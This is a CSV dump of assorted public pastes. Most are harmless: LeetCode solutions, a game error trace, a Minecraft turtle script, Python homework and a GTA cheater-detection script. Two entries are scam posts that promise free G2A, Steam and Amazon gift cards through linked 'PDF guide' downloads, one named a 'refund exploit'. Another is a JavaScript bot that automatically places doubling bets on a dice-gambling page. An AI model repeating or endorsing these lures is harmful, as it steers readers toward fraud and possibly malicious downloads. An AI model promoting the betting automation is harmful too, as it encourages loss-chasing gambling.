id,title,username,language,date,content
EjuXGaXW,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 💰,ssss50w,GetText,Wednesday 1st of May 2024 06:37:49 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
01 May 2024"
DBHhqrv1,farts back snowybot no brainfarts,coinwalk,JavaScript,Wednesday 1st of May 2024 06:36:53 AM CDT,"var olsenest = parseFloat(document.getElementById('pct_balance').value);
var dividedby = 1000;
var monkey = Number((olsenest/dividedby).toFixed(8));
var dust = (monkey/2);
var bolux = monkey;
var tens = (monkey*10);
var hundreds = (monkey*200);
var sevens = (monkey*6.9);
var eights = (monkey*7.9);
var olsen = 0;
var chickendinner = (olsenest*24);
var belance = olsenest;
var solvert = olsenest;
var silvery = ((Math.floor(olsenest/tens))*tens);
var bob = false;
var fart = 4;
 
function go(){
belance = document.getElementById('pct_balance').value;
var dog = Number((belance-olsenest).toFixed(8));
console.log(""profit"");
console.log(dog);
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=olsen)){
    bolux = bolux*2;
    olsen = parseFloat(belance);
}
if (((((belance-solvert)-hundreds)-(bolux*2))<=0)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 0;
    solvert = parseFloat(belance);
}
if ((belance>=(silvery+(tens*fart)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
    bolux = monkey;
    olsen = 0;
    fart = 4;
    solvert = parseFloat(belance);
silvery = ((Math.floor(belance/tens))*tens);
}
if (belance>=chickendinner){
console.log(""winner winner chicken dinner"");
return;
}
$('#pct_chance').val(49.5);
$('#pct_bet').val(((bolux*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 1000);
}
go();
"
0zaaPJT5,Untitled,RealBUZZARD,Lua,Wednesday 1st of May 2024 06:35:56 AM CDT,"menu.toggle_loop(menu.my_root(), 'Detect cheaters', {''}, 'Detect cheaters who\'re using ""Weapon Damage Multiplier"".',
    function()
        util.yield(1000)
        local cheaters = {}

        for _, pid in pairs(players.list()) do
            local player = {pid = pid}
            if
                PLAYER.IS_PLAYER_PLAYING(player.pid)
                and NETWORK.NETWORK_IS_PLAYER_CONNECTED(player.pid)
                and NETWORK.NETWORK_IS_PLAYER_ACTIVE(player.pid)
                and players.are_stats_ready(player.pid)
                and not NETWORK.IS_PLAYER_IN_CUTSCENE(player.pid)
                and not NETWORK.NETWORK_IS_PLAYER_FADING(player.pid)
                and not players.is_in_interior(player.pid)
            then
                player.weapon_damage_modifier = players.get_weapon_damage_modifier(player.pid)

                if player.weapon_damage_modifier > default_max_weapon_damage_modifier then
                    player.name = players.get_name(player.pid)
                    player.ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player.pid)

                    player.org_type = players.get_org_type(player.pid)
                    if player.org_type == -1 then
                        player.org_type = ""None""
                    elseif player.org_type == 0 then
                        player.org_type = ""CEO""
                    elseif player.org_type == 1 then
                        player.org_type = ""MC""
                    end

                    if PED.IS_PED_IN_ANY_VEHICLE(player.ped, false) then
                        player.is_in_vehicle = true
                        player.vehicle = PED.GET_VEHICLE_PED_IS_IN(player.ped, false)
                        player.VehicleHash = ENTITY.GET_ENTITY_MODEL(player.vehicle)
                        player.vehicleModel = util.reverse_joaat(player.VehicleHash)
                    else
                        player.is_in_vehicle = false
                        player.vehicle = nil
                        player.VehicleHash = nil
                        player.vehicleModel = nil
                    end

                    if player.org_type == ""CEO"" then
                        if player.weapon_damage_modifier > default_max_bst_weapon_damage_modifier then
                            cheaters[player.pid] = {
                                weapon_damage_modifier = player.weapon_damage_modifier,
                                organisation_type = player.org_type,
                                name = player.name
                            }
                        end
                    else
                        if player.weapon_damage_modifier > default_max_vehicle_weapon_damage_modifier then
                            if player.org_type == ""MC"" then
                                if
                                    (player.vehicleModel ~= ""vortex"")
                                    and (player.vehicleModel ~= ""oppressor2"")
                                    and (player.vehicleModel ~= ""oppressor"")
                                then
                                    cheaters[player.pid] = {
                                        weapon_damage_modifier = player.weapon_damage_modifier,
                                        organisation_type = player.org_type,
                                        name = player.name
                                    }
                                end
                            else
                                if
                                    (player.vehicleModel ~= ""oppressor2"")
                                    and (player.vehicleModel ~= ""oppressor"")
                                then
                                    cheaters[player.pid] = {
                                        weapon_damage_modifier = player.weapon_damage_modifier,
                                        organisation_type = player.org_type,
                                        name = player.name
                                    }
                                end
                            end
                        end
                    end
                end
            end
        end

        for pid, player in pairs(cheaters) do
            print(""Player "" .. player.name .. "" is detected as a cheater! Weapon Damage Modifier: "" .. player.weapon_damage_modifier .. "", Organisation: "" .. player.organisation_type)
        end
end)"
DFQ8DZVf,String Compression,jayati,C++,Wednesday 1st of May 2024 06:33:34 AM CDT,"class Solution {
public:
    int compress(vector<char>& chars) {
        int i=0,j=0;

        while(i<chars.size())
        {
            int count=1;
            while(i+count<chars.size() && chars[i+count]==chars[i])
            {
                count++;
            }
            chars[j++]=chars[i];
            if(count>1)
            {
                for(char c:to_string(count))
                {
                    chars[j++]=c;
                }
            }
            i+=count;
        }
        return j;
    }
};"
RWzK3WM8,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Wednesday 1st of May 2024 06:08:55 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_814269.pdf

Working as of:
01 May 2024"
3YA8ndDL,Untitled,nKerkhofs,Lua,Wednesday 1st of May 2024 06:07:16 AM CDT,"3x FrameXML/StaticPopup.lua:1068: attempt to call global 'ComplainInboxItem' (a nil value)
[string ""@FrameXML/StaticPopup.lua""]:1068: in function `OnAccept'
[string ""@FrameXML/StaticPopup.lua""]:5337: in function `StaticPopup_OnClick'
[string ""*StaticPopup.xml:24_OnClick""]:1: in function <[string ""*StaticPopup.xml:24_OnClick""]:1>

Locals:
self = StaticPopup1 {
 0 = <userdata>
 hideOnEscape = 1
 SubText = FontString {
 }
 ItemFrame = StaticPopup1ItemFrame {
 }
 Border = Frame {
 }
 Center = Texture {
 }
 OnBackdropSizeChanged = <function> defined @SharedXML/Backdrop.lua:182
 DarkOverlay = Frame {
 }
 TopLeftCorner = Texture {
 }
 DropDownControl = Frame {
 }
 icon = StaticPopup1AlertIcon {
 }
 AlertIcon = StaticPopup1AlertIcon {
 }
 moneyInputFrame = StaticPopup1MoneyInputFrame {
 }
 moneyFrame = StaticPopup1MoneyFrame {
 }
 BottomEdge = Texture {
 }
 GetBackdropColor = <function> defined @SharedXML/Backdrop.lua:390
 text = StaticPopup1Text {
 }
 SetBackdrop = <function> defined @SharedXML/Backdrop.lua:329
 ClearBackdrop = <function> defined @SharedXML/Backdrop.lua:282
 GetBackdropBorderColor = <function> defined @SharedXML/Backdrop.lua:409
 extraButton = StaticPopup1ExtraButton {
 }
 RightEdge = Texture {
 }
 template = ""Transparent""
 maxHeightSoFar = 82.999990
 CoverFrame = Frame {
 }
 BottomRightCorner = Texture {
 }
 SetBorderBlendMode = <function> defined @SharedXML/Backdrop.lua:266
 BottomLeftCorner = Texture {
 }
 Spinner = Frame {
 }
 itemFrame = StaticPopup1ItemFrame {
 }
 PixelSnapDisabled = true
 TopRightCorner = Texture {
 }
 data = 1
 button3 = StaticPopup1Button3 {
 }
 backdropInfo = <table> {
 }
 button4 = StaticPopup1Button4 {
 }
 SetupTextureCoordinates = <function> defined @SharedXML/Backdrop.lua:214
 extraFrame = StaticPopup1ExtraFrame {
 }
 HasBackdropInfo = <function> defined @SharedXML/Backdrop.lua:278
 GetEdgeSize = <function> defined @SharedXML/Backdrop.lua:188
 numButtons = 2
 maxWidthSoFar = 320
 button2 = StaticPopup1Button2 {
 }
 onCloseCallback = <function> defined @FrameXML/StaticPopup.lua:5272
 GetBackdrop = <function> defined @SharedXML/Backdrop.lua:347
 button1 = StaticPopup1Button1 {
 }
 TopEdge = Texture {
 }
 OnBackdropLoaded = <function> defined @SharedXML/Backdrop.lua:152
 ApplyBackdrop = <function> defined @SharedXML/Backdrop.lua:294
 editBox = StaticPopup1EditBox {
 }
 timeleft = 0
 CloseButton = StaticPopup1CloseButton {
 }
 SetBackdropBorderColor = <function> defined @SharedXML/Backdrop.lua:422
 Separator = Texture {
 }
 SetupPieceVisuals = <function> defined @SharedXML/Backdrop.lua:246
 SetBackdropColor = <function> defined @SharedXML/Backdrop.lua:399
 LeftEdge = Texture {
 }
 which = ""CONFIRM_REPORT_SPAM_MAIL""
}
index = 1
(*temporary) = nil
(*temporary) = 1
(*temporary) = ""attempt to call global 'ComplainInboxItem' (a nil value)""
"
3Yv9VFCV,Increasing Triplet Subsequence,jayati,C++,Wednesday 1st of May 2024 06:03:33 AM CDT,"class Solution {
public:
    bool increasingTriplet(vector<int>& nums) {
        int first_s=INT_MAX;
        int second_s=INT_MAX;
        for(int i=0;i<nums.size();i++)
        {
            if(nums[i]<=first_s)
            {
                first_s=nums[i];
            }
            else if(nums[i]<=second_s)
            {
                second_s=nums[i];
            }
            else
            {
                return true;
            }
        }
        return false;
        
    }
};"
WaZBEpW4,data913,TestGuy1,JSON,Wednesday 1st of May 2024 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'c60a2b3e730b65c433ca4ecb5b83eac2932ccf2789f018c6a994bfe64210604998cc16e531981d4e0e0a8290289b975e9c5db72c1c1dbc257d60644eb18ca75e13c51708d050009ff40e60dee96e73357081a83debffed0901d4df730f61c3c7fe5b6ca8ed855fd5568491a50d40132aba4888017f7cf3a6a8e7eab7b5d7f0c8',
  otherdata: [
    'f9e63a6e60f7c99618970d402cfb2668',
    '712e9c08a21751787eeaf05a169a3f95',
    '6aad44060718d427c7bcce58a67e624d',
    '090bee0d7c6933851d7b537034fe63f8',
    'b17d23eead643b17877a9e49a8a83af1',
    '1ed84a69faf50e2dda0cfcf3132d27da',
    '296d1040bd24af55d615574ab72f2bd8',
    'c1abf9f60071ec2376ac4aa7f1c82686'
  ]
}"
hfCrGgt5,turtle_startup,mathiaas,Lua,Wednesday 1st of May 2024 05:54:06 AM CDT,"dofile(""turtle_bot"")

local scriptName = ""startup""

local t = TurtleBot.new(scriptName, ""North"")
t:connect()
t.status = STATUS.IDLE
t:updateData()"
TxGyQZBu,Untitled,Farz0l1x,Python,Wednesday 1st of May 2024 05:31:45 AM CDT,"file = open('4.txt')
D, P = map(int, file.readline().split())
a = []
for i in range(D):
    st, mana = map(int, file.readline().split())
    if mana > 1:
        a.append((st, st + mana // 2, mana // 2))
a.sort()
kot = [0] * P
count = 0
maxzel = 0
for i in range(len(a)):
    st, end, zel = a[i]
    for j in range(P):
        if kot[j] <= st:
            kot[j] = end if kot[j] == 0 else end + 2
            if kot[j] > 1440:
                zel -= kot[j] - 1440
            count += zel
            maxzel = max(maxzel, zel)
            break
print(count, maxzel)"
